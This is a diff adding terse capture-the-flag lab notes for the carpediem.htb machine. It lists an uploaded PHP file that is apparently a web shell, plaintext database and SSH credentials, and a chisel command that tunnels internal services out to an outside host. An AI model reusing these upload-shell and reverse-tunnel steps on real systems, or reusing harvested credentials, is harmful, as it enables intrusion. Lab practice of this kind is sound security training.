@@ -1,0 +1,15 @@
+http://portal.carpediem.htb/uploads/1668033960_purple.jpeg
+
+http://portal.carpediem.htb/uploads/1668034020_purple.php
+
+
+   private $host = 'mysql';
+    private $username = 'portaldb';
+    private $password = 'J5tnqsXpyzkK4XNt';
+    private $database = 'portal';
+    
+    ./chisel client 10.10.14.94:9090 R:8118:172.17.0.5:8118 R:27017:172.17.0.3:27017
+
+
+
+ssh hflaccus : AuRj4pxq9qPk
